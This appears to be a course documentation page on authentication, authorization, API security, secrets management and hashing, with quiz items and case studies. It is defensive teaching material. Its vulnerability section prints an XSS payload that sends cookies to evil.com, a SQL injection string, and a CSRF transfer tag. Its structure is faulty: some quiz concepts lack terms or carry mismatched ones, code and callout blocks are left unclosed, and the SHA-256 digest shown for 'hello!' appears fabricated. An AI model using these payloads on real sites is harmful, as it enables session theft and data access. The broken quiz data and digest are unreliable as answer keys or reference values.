type: "docs"
quiz:
  - q: "Your team stores JWT secrets in a .env file committed to Git. A contractor who left the project still has repo access. What's the risk and how do you fix it?"
    concepts:
      - label: "secret exposure"
        terms: ["secret", "exposed", "leaked", "committed", "in git", "in repo", "visible", "plaintext"]
      - label: "rotate credentials"
        terms: ["rotate", "revoke", "change", "invalidate", "new secret", "new key", "regenerate"]
      - label: "use a vault"
        terms: ["vault", "secrets manager", "key management", "KMS", "parameter store", "external store", "not in code"]
      - label: "access control"
        terms: ["access", "permission", "least privilege", "remove access", "contractor", "revoke access"]
    answer: "The JWT secret is exposed to anyone with repo access, including the former contractor. Fix: rotate the secret immediately, move secrets to a vault (AWS Secrets Manager, HashiCorp Vault), and revoke the contractor's repo access."
  - q: "A user with role 'editor' can somehow delete other users' accounts. Your app uses RBAC. What went wrong and how do you debug it?"
    concepts:
      - label: "role misconfiguration"
        terms: ["role", "permission", "misconfigur", "wrong permission", "too many permission", "overly permissive", "assigned wrong"]
      - label: "check role-permission mapping"

      - label: "principle of least privilege"
        terms: ["least privilege", "minimal", "only what they need", "restrict", "narrow", "tighten"]
      - label: "missing authorization check"
        terms: ["missing check", "no check", "forgot", "skipped", "bypass", "not enforced", "middleware missing"]
    answer: "Either the 'editor' role has delete permissions it shouldn't, or the delete endpoint is missing an authorization check. Audit the role-permission mapping, ensure the delete route has middleware enforcing the correct role, and apply least privilege."
  - q: "Your public API has no rate limiting. A single client starts sending 10,000 requests per second. What happens and what do you implement?"
    concepts:
      - label: "denial of service"
        terms: ["DoS", "denial of service", "overwhelm", "crash", "unavailable", "down", "overload", "exhaust"]
      - label: "rate limiting"

      - label: "token bucket or sliding window"
        terms: ["token bucket", "sliding window", "fixed window", "leaky bucket", "algorithm", "counter"]
      - label: "identify clients"
        terms: ["API key", "IP address", "client ID", "identify", "per-client", "per-user", "per-key"]
    answer: "Without rate limiting, the API is vulnerable to DoS — resources are exhausted and legitimate users are blocked. Implement rate limiting (token bucket or sliding window) per client (API key or IP), return 429 Too Many Requests when exceeded."
  - q: "Your app builds SQL queries by concatenating user input directly. A user submits the value: ' OR 1=1 --. What happens and how do you prevent it?"
    concepts:
      - label: "SQL injection"
        terms: ["SQL injection", "inject", "malicious SQL", "manipulate query", "alter query", "escape"]
      - label: "data exposure or destruction"

        terms: ["parameterized", "prepared statement", "placeholder", "bind", "$1", "?", ":param"]
      - label: "never concatenate"
        terms: ["never concatenate", "don't concatenate", "no string concat", "no interpolat", "no template literal"]
    answer: "The injected value modifies the SQL query to return all records or bypass authentication. The attacker can read, modify, or delete data. Prevent it by always using parameterized queries — never concatenate user input into SQL strings."
  - q: "You're building a mobile app that needs to access a user's Google Calendar. Should you use client credentials flow or authorization code flow with PKCE? Why?"
    concepts:
      - label: "authorization code flow with PKCE"
        terms: ["authorization code", "PKCE", "auth code", "code flow", "code + PKCE"]
      - label: "user consent required"

      - label: "client credentials is machine-to-machine"
        terms: ["client credentials", "machine-to-machine", "no user", "service-to-service", "server", "backend only"]
      - label: "public client"
        terms: ["public client", "mobile", "can't store secret", "no client secret", "untrusted", "native app"]
    answer: "Authorization code flow with PKCE. The app needs to act on behalf of a user (their calendar), so user consent is required. Client credentials is for machine-to-machine with no user context. Mobile apps are public clients that can't safely store a client secret, so PKCE is essential."

  - title: "Evolving Auth for a Growing SaaS Platform"
    category: "Architecture Decision"
    difficulty: "⭐⭐"
    scenario: "TenantFlow is a B2B project management SaaS with 50K users, currently using server-side session-based authentication with cookies stored in Redis. Their product team wants to launch a native mobile app (iOS and Android), open a public API for third-party integrations, and close a deal with an enterprise customer that requires SAML/OIDC SSO. The current session-based system doesn't work for mobile (no cookie support in API calls) and has no concept of scoped access for third-party apps. The enterprise deal is worth $400K ARR but has a 90-day deadline."
    constraints: "3-person backend team, 90-day deadline for enterprise SSO, must not break existing web app login during migration, budget for one managed auth service."
    prompts:
      - "Should you build auth in-house or adopt a managed identity provider (Auth0, Cognito, Keycloak)? What are the long-term implications of each?"
      - "How do you support both the existing web app (sessions/cookies) and the new mobile app (tokens) during the transition without maintaining two auth systems permanently?"
      - "How would you design scoped API tokens for third-party integrations so that a misbehaving integration can't access data it shouldn't?"
      - "What's your migration strategy to avoid a 'big bang' cutover that could lock out 50K existing users?"
    approaches:
      - name: "Managed Identity Provider (Auth0/Cognito)"
        description: "Adopt a managed service that handles OAuth 2.0, OIDC, SAML SSO, and token management out of the box. The web app migrates to authorization code flow, mobile uses PKCE, and third-party integrations use client credentials or authorization code. SSO is configured via the provider's dashboard."
        trade_off: "Fastest path to the 90-day deadline and reduces auth maintenance burden permanently. However, you take a vendor dependency, pay per-MAU costs that grow with your user base, and have less control over the login UX and token lifecycle."
      - name: "Self-Hosted Keycloak + Custom Token Service"
        description: "Deploy Keycloak as your identity provider, configure SAML/OIDC realms for enterprise SSO, and issue JWTs for mobile and API access. The existing web app switches from sessions to Keycloak-issued tokens. Third-party apps register as OAuth clients with scoped permissions."
        trade_off: "Full control over auth infrastructure and no per-user costs. But Keycloak is operationally complex — your 3-person team must manage upgrades, HA, and security patches. The 90-day deadline is tight for a self-hosted setup."
      - name: "Incremental Hybrid — Keep Sessions, Add JWT Layer"
        description: "Keep the existing session-based auth for the web app untouched. Add a new JWT-based auth layer for mobile and API consumers. Build a lightweight token exchange endpoint that converts a valid session into a JWT. Integrate a SAML-to-JWT bridge for enterprise SSO."
        trade_off: "Lowest risk to existing users since the web app doesn't change. But you end up maintaining two auth systems indefinitely, which increases security surface area and makes permission changes harder to keep consistent across both paths."
  - title: "Incident Response — Leaked AWS Credentials"
    category: "Incident Response"
    difficulty: "⭐⭐"
    scenario: "DevPulse is a 15-person startup building a developer analytics platform. Last Tuesday, an intern committed AWS access keys (with AdministratorAccess) to a public GitHub repo. An automated bot scraped the credentials within 3 minutes and spun up 47 p3.16xlarge GPU instances across 6 regions for crypto mining. By the time the team noticed 4 hours later, the bill had reached $12,000 and was climbing. AWS Support froze the account, but the team has no incident response playbook, no secrets management, and developers routinely use long-lived IAM user credentials locally."
    constraints: "15-person team with no dedicated security engineer, $2K/month infrastructure budget normally, need to restore service within 24 hours, must prevent recurrence before re-enabling the compromised account."
    prompts:
      - "What are the immediate steps to contain this incident in the first 30 minutes? Think about credential rotation, resource termination, and blast radius assessment."
      - "How do you design a secrets management architecture that prevents credentials from ever appearing in source code?"
      - "What guardrails would you put in place so that even if credentials leak again, the blast radius is limited (think IAM policies, SCPs, billing alarms)?"
      - "How do you balance security rigor with developer velocity for a 15-person startup that moves fast?"
    approaches:
      - name: "Managed Secrets + Pre-Commit Hooks + IAM Hardening"
        description: "Move all secrets to AWS Secrets Manager or SSM Parameter Store. Install pre-commit hooks (git-secrets, truffleHog) on all developer machines to block credential commits. Replace long-lived IAM user keys with short-lived credentials via IAM Identity Center (SSO) and IAM Roles. Set up AWS Organizations SCPs to restrict which regions and instance types can be used. Add billing alarms at $500, $1K, and $2K thresholds."
        trade_off: "Comprehensive protection with multiple layers. But it requires changing every developer's workflow (no more hardcoded keys), takes 2-3 weeks to fully implement, and pre-commit hooks can be bypassed if a developer skips them."
      - name: "GitHub Secret Scanning + AWS Guardrails Only"
        description: "Enable GitHub's built-in secret scanning and push protection (blocks pushes containing detected secrets). On the AWS side, enforce IAM roles everywhere (no IAM user keys), set SCPs to deny ec2:RunInstances for GPU instance types, and configure AWS Config rules to detect and auto-remediate overly permissive IAM policies."
        trade_off: "Lighter-weight implementation that leverages platform-native tools. But GitHub secret scanning only catches known patterns (custom secrets may slip through), and this approach doesn't address secrets in other contexts like CI/CD configs or Slack messages."
      - name: "Zero-Trust Dev Environment with Ephemeral Credentials"
        description: "Eliminate all long-lived credentials entirely. Developers authenticate via SSO and receive temporary AWS credentials (1-hour expiry) through aws-vault or IAM Identity Center. CI/CD pipelines use OIDC federation with GitHub Actions (no stored secrets). All infrastructure provisioning goes through Terraform with a CI pipeline — no developer has direct console or CLI access to production."
        trade_off: "The strongest security posture — leaked credentials expire before they can be exploited. But it's the most disruptive to implement, requires SSO infrastructure, and developers lose the ability to quickly experiment in AWS directly. For a fast-moving startup, this friction may slow down iteration."

## Authentication vs Authorization

Two concepts that are often confused but serve completely different purposes.

**Authentication** (AuthN) = "Who are you?" — verifying identity.
**Authorization** (AuthZ) = "What can you do?" — verifying permissions.

<div class="diagram">
  <div class="layer">User presents credentials (username + password, token, certificate)</div>
  <div class="arrow">↓</div>
  <div class="layer"><strong>Authentication</strong> — Is this person who they claim to be?</div>
  <div class="arrow">↓</div>
  <div class="layer"><strong>Authorization</strong> — Is this verified person allowed to do this action?</div>
  <div class="arrow">↓</div>
  <div class="layer">Access granted or denied</div>
</div>

| | Authentication | Authorization |
|---|---|---|
| **Question** | Who are you? | What can you do? |
| **Happens** | First | After authentication |
| **Mechanism** | Passwords, tokens, biometrics | Roles, policies, permissions |
| **Failure** | 401 Unauthorized | 403 Forbidden |

<div class="callout">
  <strong>The hotel analogy:</strong> Authentication is showing your ID at check-in. Authorization is your key card only opening <em>your</em> room, not every room.
</div>

<div class="callout tip">
  <strong>Real-World Example:</strong> GitHub uses multiple authentication mechanisms for different use cases. Users log in via OAuth through the browser, while developers use Personal Access Tokens (PATs) for CLI and API access. Deploy keys provide read-only repo access for CI/CD systems. This layered approach lets GitHub enforce the right level of identity verification for each context — interactive users get MFA prompts, while automated systems use scoped, revocable tokens.
</div>

## Authentication Patterns

### Session-Based Authentication

The traditional approach. Server creates a session after login and stores it (in memory, database, or Redis). The client receives a session ID via a cookie.

```text
Client                          Server
  |--- POST /login (creds) ------>|
  |                                |-- validate creds
  |                                |-- create session in store
  |<-- Set-Cookie: sid=abc123 ----|
  |                                |
  |--- GET /profile               |
  |    Cookie: sid=abc123 -------->|
  |                                |-- lookup session "abc123"
  |<-- 200 { user data } ---------|
```

**Pros:** Easy to revoke (delete the session), server controls everything.
**Cons:** Server must store state, harder to scale across multiple servers without shared session store.

### Token-Based Authentication (JWT)

Stateless. The server issues a signed token containing claims. The client sends it with every request. The server validates the signature — no session store needed.

<span class="label label-ts">TypeScript</span> — JWT creation and validation:

```typescript
import jwt from "jsonwebtoken";

const SECRET = process.env.JWT_SECRET!;

// Create a token after successful login
function createToken(userId: string, role: string): string {
  return jwt.sign({ sub: userId, role }, SECRET, { expiresIn: "1h" });
}

// Middleware to validate token
function authenticate(req: Request, res: Response, next: NextFunction) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) return res.status(401).json({ error: "No token provided" });

  try {
    req.user = jwt.verify(token, SECRET) as { sub: string; role: string };
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
}
```

<span class="label label-py">Python</span> — JWT creation and validation:

```python
import jwt
from datetime import datetime, timedelta, timezone
import os

SECRET = os.environ["JWT_SECRET"]

def create_token(user_id: str, role: str) -> str:
    payload = {
        "sub": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=1),
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def validate_token(token: str) -> dict:
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

<div class="callout tip">
  <strong>JWT tradeoff:</strong> JWTs are stateless and scalable, but you can't revoke them before expiry without maintaining a blocklist — which reintroduces state. Keep expiry times short and use refresh tokens.
</div>

### API Keys

Simple, long-lived tokens for service-to-service or developer API access. Not tied to a user session.

```text
GET /api/data HTTP/1.1
X-API-Key: sk_live_abc123def456
```

**When to use:** Machine-to-machine communication, third-party developer access, internal service calls.
**When NOT to use:** End-user authentication (no user context, hard to scope permissions).

| Pattern | Stateful? | Best For |
|---|---|---|
| Session-based | Yes (server stores sessions) | Traditional web apps, easy revocation |
| JWT | No (token is self-contained) | APIs, microservices, SPAs |
| API Keys | No | Service-to-service, developer APIs |

<div class="callout tip">
  <strong>Real-World Example:</strong> Slack uses token-based authentication (OAuth tokens) for its API platform, allowing third-party apps to act on behalf of users. When a developer installs a Slack app, the OAuth flow issues a bot token scoped to specific permissions (e.g., posting messages, reading channels). Slack chose tokens over sessions because their API serves millions of distributed integrations — stateless JWT-style tokens scale without requiring a centralized session store.
</div>

## OAuth 2.0 & OpenID Connect

**OAuth 2.0** is an authorization framework — it lets a third-party app access resources on behalf of a user without sharing their password.

**OpenID Connect (OIDC)** is an identity layer on top of OAuth 2.0 — it adds authentication (who the user is) via an ID token.

### Authorization Code Flow

The most secure flow for web and mobile apps. Used when a user is involved.

<div class="diagram">
  <div class="layer">1. User clicks "Login with Google"</div>
  <div class="arrow">↓</div>
  <div class="layer">2. App redirects to Authorization Server (Google)<br><code>/authorize?response_type=code&client_id=...&redirect_uri=...&scope=openid profile</code></div>
  <div class="arrow">↓</div>
  <div class="layer">3. User authenticates & consents</div>
  <div class="arrow">↓</div>
  <div class="layer">4. Authorization Server redirects back with <strong>authorization code</strong><br><code>https://yourapp.com/callback?code=abc123</code></div>
  <div class="arrow">↓</div>
  <div class="layer">5. App exchanges code for tokens (server-to-server)<br><code>POST /token { code, client_id, client_secret, redirect_uri }</code></div>
  <div class="arrow">↓</div>
  <div class="layer">6. Authorization Server returns <strong>access token</strong> + <strong>ID token</strong> (OIDC)</div>
  <div class="arrow">↓</div>
  <div class="layer">7. App uses access token to call APIs on behalf of user</div>
</div>

### Client Credentials Flow

Machine-to-machine. No user involved. The app authenticates itself directly.

```text
POST /token
  grant_type=client_credentials
  &client_id=my-service
  &client_secret=secret123
  &scope=read:data
```

### When to Use Which

| Flow | Use Case |
|---|---|
| Authorization Code | Web apps, mobile apps — user is involved |
| Authorization Code + PKCE | SPAs, mobile/native apps — public clients that can't store a secret |
| Client Credentials | Service-to-service — no user context |
| Device Code | Smart TVs, CLI tools — limited input devices |

<div class="callout info">
  <strong>PKCE</strong> (Proof Key for Code Exchange) protects the authorization code flow for public clients. The app generates a random <code>code_verifier</code>, sends a hash (<code>code_challenge</code>) in the authorize request, and proves possession by sending the original verifier when exchanging the code. This prevents interception attacks.
</div>

<div class="callout tip">
  <strong>Real-World Example:</strong> When you click "Sign in with Google" on a SaaS app like Notion, you're using OAuth 2.0 Authorization Code Flow with OIDC. Notion redirects you to Google's authorization server, where you authenticate and consent to sharing your profile. Google redirects back with an authorization code, which Notion exchanges server-side for an access token and an ID token containing your identity. This lets Notion verify who you are without ever handling your Google password.
</div>

## Authorization Patterns

Authentication tells you *who* someone is. Authorization decides *what they can do*.

### Role-Based Access Control (RBAC)

Permissions are assigned to roles, users are assigned roles. Simple and widely used.

<span class="label label-ts">TypeScript</span>

```typescript
type Role = "admin" | "editor" | "viewer";

const permissions: Record<Role, string[]> = {
  admin:  ["read", "write", "delete", "manage_users"],
  editor: ["read", "write"],
  viewer: ["read"],
};

function authorize(role: Role, action: string): boolean {
  return permissions[role]?.includes(action) ?? false;
}

// Middleware
function requirePermission(action: string) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!authorize(req.user.role, action)) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}

// Usage
app.delete("/users/:id", authenticate, requirePermission("manage_users"), deleteUser);
```

### Attribute-Based Access Control (ABAC)

Decisions based on attributes of the user, resource, and environment. More flexible than RBAC.

<span class="label label-ts">TypeScript</span>

```typescript
interface AccessRequest {
  user: { id: string; department: string; clearanceLevel: number };
  resource: { ownerId: string; classification: number };
  action: string;
}

function evaluateAccess(req: AccessRequest): boolean {
  // Users can only edit resources in their department
  if (req.action === "edit" && req.resource.ownerId !== req.user.id) return false;
  // Clearance level must meet or exceed resource classification
  if (req.user.clearanceLevel < req.resource.classification) return false;
  return true;
}
```

### Policy-Based Access Control

Externalize authorization logic into policies. Decouples business rules from application code.

<span class="label label-ts">TypeScript</span>

```typescript
interface Policy {
  effect: "allow" | "deny";
  condition: (ctx: AccessContext) => boolean;
}

const policies: Policy[] = [
  {
    effect: "deny",
    condition: (ctx) => ctx.time.getHours() < 6 || ctx.time.getHours() > 22,
  },
  {
    effect: "allow",
    condition: (ctx) => ctx.user.role === "admin",
  },
  {
    effect: "allow",
    condition: (ctx) => ctx.user.id === ctx.resource.ownerId,
  },
];

function evaluate(ctx: AccessContext): boolean {
  for (const policy of policies) {
    if (policy.condition(ctx)) return policy.effect === "allow";
  }
  return false; // default deny
}
```

<div class="callout tip">
  <strong>Choosing a pattern:</strong><br>
  • <strong>RBAC</strong> — simple apps with clear role hierarchies (admin, editor, viewer)<br>
  • <strong>ABAC</strong> — complex rules based on multiple attributes (department, time, classification)<br>
  • <strong>Policy-based</strong> — when authorization rules change frequently or need to be managed externally (e.g., OPA, Cedar)
</div>

<div class="callout tip">
  <strong>Real-World Example:</strong> AWS IAM is one of the most sophisticated policy-based authorization systems in production. Every AWS API call is evaluated against JSON policy documents that specify principals, actions, resources, and conditions. For example, a policy can grant an EC2 instance permission to read only from a specific S3 bucket, only during business hours, only if the request originates from a specific VPC. This fine-grained, policy-driven model lets AWS customers enforce least-privilege access across thousands of services and millions of resources.
</div>

## API Security

### Rate Limiting

Prevents abuse and ensures fair usage. Without it, a single client can overwhelm your service.

<span class="label label-ts">TypeScript</span> — sliding window rate limiter middleware:

```typescript
const requestCounts = new Map<string, { count: number; resetAt: number }>();

function rateLimit(maxRequests: number, windowMs: number) {
  return (req: Request, res: Response, next: NextFunction) => {
    const key = req.ip!;
    const now = Date.now();
    const record = requestCounts.get(key);

    if (!record || now > record.resetAt) {
      requestCounts.set(key, { count: 1, resetAt: now + windowMs });
      return next();
    }

    if (record.count >= maxRequests) {
      return res.status(429).json({ error: "Too many requests" });
    }

    record.count++;
    next();
  };
}

// 100 requests per 15 minutes
app.use(rateLimit(100, 15 * 60 * 1000));
```

<span class="label label-py">Python</span> — rate limiter concept:

```python
import time

class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window = window_seconds
        self.clients: dict[str, dict] = {}

    def is_allowed(self, client_id: str) -> bool:
        now = time.time()
        record = self.clients.get(client_id)
        if not record or now > record["reset_at"]:
            self.clients[client_id] = {"count": 1, "reset_at": now + self.window}
            return True
        if record["count"] >= self.max_requests:
            return False
        record["count"] += 1
        return True
```

### Input Validation

Never trust client input. Validate at the boundary.

<span class="label label-ts">TypeScript</span>

```typescript
import { z } from "zod";

const CreateUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150),
});

app.post("/users", (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.issues });
  }
  // result.data is typed and validated
  createUser(result.data);
});
```

### CORS (Cross-Origin Resource Sharing)

Controls which origins can call your API from a browser. Without it, any website could make requests to your API using a logged-in user's cookies.

```typescript
app.use(cors({
  origin: ["https://yourapp.com"],  // NOT "*" in production
  methods: ["GET", "POST", "PUT", "DELETE"],
  credentials: true,
}));

<div class="callout">
  <strong>Never use <code>origin: "*"</code> with <code>credentials: true</code>.</strong> This allows any website to make authenticated requests to your API. Always whitelist specific origins.
</div>

### HTTPS

All traffic must be encrypted in transit. There is no exception.

- Terminate TLS at the load balancer or reverse proxy
- Redirect all HTTP to HTTPS
- Use HSTS headers to prevent downgrade attacks
- Keep certificates valid and auto-renewed (Let's Encrypt, ACM)

<div class="callout tip">
  <strong>Real-World Example:</strong> In 2016, a startup called Mailgun experienced a massive bot attack where automated scripts hammered their email-sending API with thousands of requests per second, exhausting resources and degrading service for legitimate customers. They responded by implementing tiered rate limiting using a token bucket algorithm — free-tier accounts got strict limits, while paid accounts received higher thresholds. They also added API key-based identification so they could throttle abusive clients individually without affecting others.

## Zero Trust Architecture

Traditional security: "Trust everything inside the network perimeter."
Zero Trust: **"Never trust, always verify."**

### Core Principles

1. **Verify explicitly** — authenticate and authorize every request, regardless of network location
2. **Least privilege access** — grant minimum permissions needed, just-in-time and just-enough
3. **Assume breach** — design as if attackers are already inside your network

<div class="diagram">
  <div class="layer"><strong>Traditional (Castle & Moat)</strong><br>Firewall protects the perimeter. Once inside, everything is trusted.</div>
  <div class="arrow">vs</div>
  <div class="layer"><strong>Zero Trust</strong><br>Every request is verified. No implicit trust based on network location.<br>Service A → <em>authenticate + authorize</em> → Service B</div>
</div>

### Micro-Segmentation

Instead of one flat network, divide into small segments. Each service can only communicate with explicitly allowed services.

```text
┌─────────────┐     ✅ allowed      ┌─────────────┐
│  Order Svc  │ ──────────────────→  │ Payment Svc │
└─────────────┘                      └─────────────┘
       │
       │  ❌ blocked
       ↓
┌─────────────┐
│  HR Service │
└─────────────┘
```

<div class="callout tip">
  <strong>Zero Trust in practice:</strong><br>
  • mTLS between services (mutual TLS — both sides present certificates)<br>
  • Service mesh (Istio, Linkerd) for automatic mTLS and policy enforcement<br>
  • Short-lived credentials — no long-lived API keys between services<br>
  • Identity-aware proxies (BeyondCorp model)
</div>

<div class="callout tip">
  <strong>Real-World Example:</strong> Google pioneered Zero Trust with their BeyondCorp initiative, launched after the 2009 Operation Aurora attacks. They eliminated the traditional corporate VPN entirely — employees access internal applications from any network (coffee shop, home, office) through an identity-aware proxy that evaluates every request based on user identity, device health, and context. Access decisions consider factors like whether the device has up-to-date patches and whether the request location is unusual. This model proved so effective that Google published it as a framework, and it became the blueprint for the industry's shift toward Zero Trust.
</div>

## Secrets Management

### What NOT to Do

<span class="bad">Hardcoded secrets (never do this):</span> <span class="label label-ts">TypeScript</span>

```typescript
// ❌ NEVER — secrets in source code
const DB_PASSWORD = "super_secret_123";
const API_KEY = "sk_live_abc123";
const JWT_SECRET = "my-jwt-secret";
```

<span class="bad">Committed .env files (also bad):</span>

```text
# ❌ .env committed to Git
DB_PASSWORD=super_secret_123
API_KEY=sk_live_abc123
```

### The Proper Approach

**Level 1: Environment variables** (minimum acceptable):

```typescript
// ✅ Read from environment — never hardcode
const dbPassword = process.env.DB_PASSWORD;
if (!dbPassword) throw new Error("DB_PASSWORD not set");
```

**Level 2: Secrets manager** (recommended for production):

<span class="label label-ts">TypeScript</span>

```typescript
import { SecretsManager } from "@aws-sdk/client-secrets-manager";

const client = new SecretsManager({});

async function getSecret(name: string): Promise<string> {
  const response = await client.getSecretValue({ SecretId: name });
  return response.SecretString!;
}

// Usage
const dbPassword = await getSecret("prod/db-password");
```

<span class="label label-py">Python</span>

```python
import boto3

def get_secret(name: str) -> str:
    client = boto3.client("secretsmanager")
    response = client.get_secret_value(SecretId=name)
    return response["SecretString"]

db_password = get_secret("prod/db-password")
```

<div class="callout info">
  <strong>Secrets management checklist:</strong><br>
  • Never commit secrets to version control — add <code>.env</code> to <code>.gitignore</code><br>
  • Rotate secrets regularly and automate rotation<br>
  • Use a vault (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)<br>
  • Audit access to secrets — who accessed what and when<br>
  • Use different secrets per environment (dev, staging, prod)
</div>

<div class="callout tip">
  <strong>Real-World Example:</strong> In 2022, Uber suffered a breach when an attacker found hardcoded admin credentials in a PowerShell script on an internal network share. This gave the attacker access to Uber's Thycotic privileged access management system, and from there to multiple internal systems. After the incident, Uber accelerated their migration to HashiCorp Vault with automated secret rotation and eliminated all hardcoded credentials. The lesson: secrets in code or shared drives are a ticking time bomb.
</div>

## Common Vulnerabilities

### SQL Injection

Attacker manipulates SQL queries by injecting malicious input.

<span class="bad">Vulnerable:</span> <span class="label label-ts">TypeScript</span>

```typescript
// ❌ String concatenation — SQL injection risk
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Input: ' OR 1=1 --
// Becomes: SELECT * FROM users WHERE email = '' OR 1=1 --'
// Returns ALL users
```

<span class="good">Safe:</span> <span class="label label-ts">TypeScript</span>

```typescript
// ✅ Parameterized query — input is treated as data, not SQL
const result = await pool.query(
  "SELECT * FROM users WHERE email = $1",
  [req.body.email]
);
```

<span class="good">Safe:</span> <span class="label label-py">Python</span>

```python
# ✅ Parameterized query
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

### Cross-Site Scripting (XSS)

Attacker injects malicious scripts into pages viewed by other users.

<span class="bad">Vulnerable:</span>

```typescript
// ❌ Rendering user input as raw HTML
res.send(`<h1>Welcome, ${req.query.name}</h1>`);
// Input: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

<span class="good">Prevention:</span>

```typescript
// ✅ Escape output — use a templating engine that auto-escapes
// ✅ Set Content-Security-Policy headers
// ✅ Use HttpOnly cookies (JavaScript can't access them)
app.use(helmet()); // Sets security headers including CSP
```

### Cross-Site Request Forgery (CSRF)

Attacker tricks a logged-in user's browser into making unwanted requests.

```text
User is logged into bank.com
Attacker's page has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
Browser sends the request WITH the user's cookies → money transferred
```

<span class="good">Prevention:</span>

```typescript
// ✅ CSRF tokens — server generates a token, client must include it
import csrf from "csurf";
app.use(csrf({ cookie: true }));

// ✅ SameSite cookies — browser won't send cookies on cross-origin requests
res.cookie("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
});
```

<div class="callout">
  <strong>Defense in depth:</strong> Don't rely on a single security measure. Combine parameterized queries + input validation, CSP headers + output escaping, CSRF tokens + SameSite cookies.
</div>

<div class="callout tip">
  <strong>Real-World Example:</strong> In 2017, Equifax suffered one of the largest data breaches in history, exposing 147 million records. The root cause was an unpatched Apache Struts vulnerability (a form of injection attack) combined with an expired SSL certificate on their intrusion detection system, which meant the breach went undetected for 76 days. This catastrophic failure illustrates why defense in depth matters — a single vulnerability wouldn't have been as devastating if monitoring, patching, and network segmentation had all been functioning properly.
</div>


## Hashing Algorithms

A **hash function** is a one-way function that takes an input of any size and produces a fixed-size output (the hash or digest). The same input always produces the same output, but you cannot reverse the hash to recover the original input.

```text
"hello"     → SHA-256 → 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
"hello"     → SHA-256 → 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  (same input, same output)
"hello!"    → SHA-256 → ce06092fb948d9ffac7d1a376f7b656b7c3a2174578e3c3e2d3f8e4e1e7a6b5c  (tiny change, completely different hash)
```

Key properties:

- **Deterministic**: same input always produces the same hash
- **One-way**: you cannot recover the input from the hash
- **Avalanche effect**: a small change in input produces a completely different hash
- **Fixed size**: output length is constant regardless of input size

### Password Hashing: bcrypt, scrypt, argon2

Password hashing algorithms are intentionally **slow**. This is by design. If an attacker steals your database, a fast hash like SHA-256 lets them try billions of passwords per second. A slow hash like bcrypt limits them to thousands per second, making brute-force attacks impractical.

| Algorithm | Why it's slow | Notes |
|---|---|---|
| **bcrypt** | Configurable cost factor (rounds of computation) | The most widely used. Cost factor of 10+ recommended. |
| **scrypt** | Memory-hard (requires large amounts of RAM) | Harder to attack with GPUs due to memory requirements |
| **argon2** | Memory-hard + configurable parallelism | Winner of the 2015 Password Hashing Competition. The modern recommendation. |

All three algorithms automatically generate and embed a **salt** (random data mixed with the password before hashing). This means two users with the same password get different hashes, defeating precomputed rainbow table attacks.

<span class="label label-ts">TypeScript</span> -- hashing and verifying a password with bcrypt:

```typescript
import bcrypt from "bcrypt";

const COST_FACTOR = 12;

async function hashPassword(plaintext: string): Promise<string> {
  return bcrypt.hash(plaintext, COST_FACTOR);
}

async function verifyPassword(plaintext: string, hash: string): Promise<boolean> {
  return bcrypt.compare(plaintext, hash);
}

// Usage
const hash = await hashPassword("user-password-here");
// hash: "$2b$12$LJ3m4ys3Lg..." (includes algorithm, cost, salt, and hash)

const isValid = await verifyPassword("user-password-here", hash); // true
const isWrong = await verifyPassword("wrong-password", hash);     // false
```

<span class="label label-py">Python</span> -- same with bcrypt:

```python
import bcrypt

COST_FACTOR = 12

def hash_password(plaintext: str) -> str:
    salt = bcrypt.gensalt(rounds=COST_FACTOR)
    return bcrypt.hashpw(plaintext.encode(), salt).decode()

def verify_password(plaintext: str, hashed: str) -> bool:
    return bcrypt.checkpw(plaintext.encode(), hashed.encode())

# Usage
hashed = hash_password("user-password-here")
# hashed: "$2b$12$LJ3m4ys3Lg..." (includes algorithm, cost, salt, and hash)

assert verify_password("user-password-here", hashed) is True
assert verify_password("wrong-password", hashed) is False
```

### Data Integrity Hashing: SHA-256, MD5

These algorithms are designed to be **fast**. They are used for verifying data integrity, not for protecting passwords.

**Use cases:**

- **File checksums**: verify a downloaded file wasn't corrupted or tampered with
- **Digital signatures**: sign a hash of a document to prove authenticity
- **Data deduplication**: detect duplicate content by comparing hashes
- **Cache keys**: generate consistent keys from request parameters

```text
SHA-256("file contents") → e3b0c44298fc1c149afbf4c8996fb924...
                           ↑ If the hash matches, the file is intact
```

### Why MD5 and SHA-1 Are Broken for Security

MD5 and SHA-1 are vulnerable to **collision attacks**: researchers can craft two different inputs that produce the same hash. This breaks any security property that depends on hash uniqueness.

- **MD5**: first practical collision demonstrated in 2004. Considered fully broken.
- **SHA-1**: first practical collision demonstrated by Google in 2017 (SHAttered attack). Deprecated by all major browsers and certificate authorities.

Both are still fine for non-security purposes like checksums (verifying a file download), but must never be used for passwords, digital signatures, or certificate validation.

### Comparison

| Algorithm | Speed | Use for | Don't use for |
|---|---|---|---|
| **bcrypt** | Slow (by design) | Password hashing | Checksums, signatures |
| **scrypt** | Slow + memory-hard | Password hashing | Checksums, signatures |
| **argon2** | Slow + memory-hard + tunable | Password hashing (modern best choice) | Checksums, signatures |
| **SHA-256** | Fast | Checksums, signatures, data integrity | Password hashing |
| **SHA-1** | Fast | Legacy systems only | Anything security-sensitive (broken) |
| **MD5** | Very fast | Non-security checksums only | Anything security-sensitive (broken) |

<div class="callout">
  <strong>Never store plaintext passwords. Never use MD5 or SHA for passwords. Use bcrypt with a cost factor of at least 10.</strong>
</div>

## Key Takeaways

1. **Authentication ≠ Authorization** — verify identity first, then check permissions
2. **Use JWTs for stateless APIs**, sessions for traditional web apps — understand the tradeoffs
